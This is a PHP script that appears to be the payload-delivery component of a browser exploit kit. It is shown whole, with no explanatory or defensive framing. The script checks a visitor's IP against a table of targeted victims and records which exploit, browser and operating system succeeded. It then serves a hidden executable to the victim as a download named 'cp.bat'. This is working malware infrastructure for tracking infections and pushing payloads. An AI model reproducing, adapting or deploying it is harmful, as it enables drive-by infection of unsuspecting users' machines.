<?php 
ob_start();
require_once("config.inc.php");
require_once("CP-ENC-7531.php");
$ip = $cpFunctions->GetIP();
$cpMySQL->ConnectMySQL();
$count = mysql_query("SELECT * FROM `" . $cpMySQL->DataDecrypt(MYSQLPREFIX) . "peeps` WHERE ip = '" . $ip . "' AND sploit = ''");
if( mysql_num_rows($count) < 1 ) 
{
    $cpFunctions->Error404Dupe();
}

if( !isset($_GET["o"]) || !isset($_GET["b"]) || !isset($_GET["spl"]) ) 
{
    $cpFunctions->Error404Dupe();
}

$spl = $cpMySQL->antisqli($_GET["spl"]);
$b = $cpMySQL->antisqli($_GET["b"]);
$o = $cpMySQL->antisqli($_GET["o"]);
if( isset($_GET["i"]) ) 
{
    $i = $cpMySQL->antisqli($_GET["i"]);
}
else
{
    $i = "unk";
}

$cpMySQL->AddExploitedIp($spl, $b, $o, $i);
$exename = $cpMySQL->DataDecrypt(LOADEXE);
$content = file_get_contents($exename);
$fsize = strlen($content);
header("Accept-Ranges: bytes\r\n");
header("Content-Length: " . $fsize . "\r\n");
header("Content-Disposition: attachment; filename=cp.bat\r\n");
header("Content-Type: application/octet-stream\r\n\r\n");
echo $content;
ob_end_flush();

